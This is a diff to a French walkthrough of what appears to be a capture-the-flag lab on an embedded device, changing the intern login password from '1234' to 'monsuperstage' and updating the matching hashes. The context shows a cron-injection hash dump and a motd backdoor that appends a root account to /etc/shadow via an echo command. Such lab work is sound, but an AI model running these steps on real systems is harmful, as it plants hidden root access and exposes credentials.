@@ -4,7 +4,7 @@
 
 ```
 [FOOTHOLD]        [CREDENTIAL ACCESS]          [PRIVESC]
-stagiaire/1234 ──► cron injection ──► admin/??? ──► motd backdoor ──► root shell
+stagiaire/monsuperstage ──► cron injection ──► admin/??? ──► motd backdoor ──► root shell
 ```
 
 ---
@@ -50,7 +50,7 @@ pio device monitor
 
 ```
 Login    : stagiaire
-Password : 1234
+Password : monsuperstage
 ```
 
 L'accès est limité (`user`) : pas d'accès aux répertoires des autres comptes, pas de lecture de `/root/` ni de `/etc/shadow`.
@@ -84,7 +84,7 @@ edit /scripts/maintenance.msh
 
 cat /tmp/loot.txt
 # root:2260a49226afcd3bb784cb3e3888ea91:root       ← incrackable
-# stagiaire:81dc9bdb52d04dc20036dbd8313ed055:user  ← connu (1234)
+# stagiaire:a963f94274c1e9eb8dea99691443ab07:user  ← connu (fourni sur fiche)
 # admin:f7b16af5588f9654862e4aefcec8b0de:admin     ← à cracker
 ```
 
@@ -134,13 +134,13 @@ En créant `motd_perso.txt` avec une commande d'écriture dans `/etc/shadow`, l'
 
 ```bash
 edit motd_perso.txt
-# → ajouter : echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow
+# → ajouter : echo pwned:a963f94274c1e9eb8dea99691443ab07:root >> /etc/shadow
 # → sauvegarder (w)
 
 motd
 # → exécution en root → compte "pwned" ajouté dans /etc/shadow
 
-su pwned   # password : 1234  (hash réutilisé depuis /tmp/loot.txt)
+su pwned   # password : monsuperstage  (hash réutilisé depuis /tmp/loot.txt)
 ```
 
 **Accès obtenu** : shell root réel.
@@ -222,8 +222,8 @@ cat user.txt                    # base64 → decoder hors application
 
 # Phase 4 — Root
 edit motd_perso.txt
-# → :a  →  echo pwned:81dc9bdb52d04dc20036dbd8313ed055:root >> /etc/shadow  →  Entrée  →  :wq
+# → :a  →  echo pwned:a963f94274c1e9eb8dea99691443ab07:root >> /etc/shadow  →  Entrée  →  :wq
 motd
-su pwned                        # password : 1234
+su pwned                        # password : monsuperstage
 cat /root/root.txt              # base64 → decoder hors application
 ```
